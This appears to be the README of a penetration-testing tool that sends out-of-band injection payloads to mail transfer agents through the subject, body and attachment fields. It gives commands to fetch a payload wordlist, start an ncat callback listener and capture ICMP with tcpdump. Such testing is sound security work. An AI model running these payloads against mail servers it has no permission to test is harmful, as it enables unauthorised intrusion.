# MTA_tester
Mail Transfer Agent OOB tester.

# WHY?
Swaks could not handle the the payloads.
Additionally, to have a template for interacting with SMTP using Python.

# USAGE
* Set your VPS IP and DOMAIN COLLABORATOR to prepare a wordlist:
```
export vps_ip=
export domain_collab=
wget https://raw.githubusercontent.com/Karmaz95/crimson/master/words/exp/OOB
cat OOB|sed "s/domain_collab/$domain_collab/g"|sed "s/vps_ip/$vps_ip/g">oob.txt && rm OOB
```
* Run netcat listener in the second terminal:
```
sudo ncat -nklvp 80
```
* In the third terminal window start tcpdump:
```
sudo tcpdump icmp | tee -a tcpdump_oob.txt
``` 

### TESTING SUBJECT HEADER
```
python MTA_tester.py -f "attacker@smtp.vps.com" -t "victim@gmail.com" -s "smtp.vps.com:25" -w oob.txt -i subject
```
### TESTING BODY
```
python MTA_tester.py -f "attacker@smtp.vps.com" -t "victim@gmail.com" -s "smtp.vps.com:25" -w oob.txt -i body
```
### TESTING FILE NAME
```
python MTA_tester.py -f "attacker@smtp.vps.com" -t "victim@gmail.com" -s "smtp.vps.com:25" -w oob.txt -i filename
```
### TESTING FILE BODY
```
python MTA_tester.py -f "attacker@smtp.vps.com" -t "victim@gmail.com" -s "smtp.vps.com:25" -w oob.txt -i filebody
```
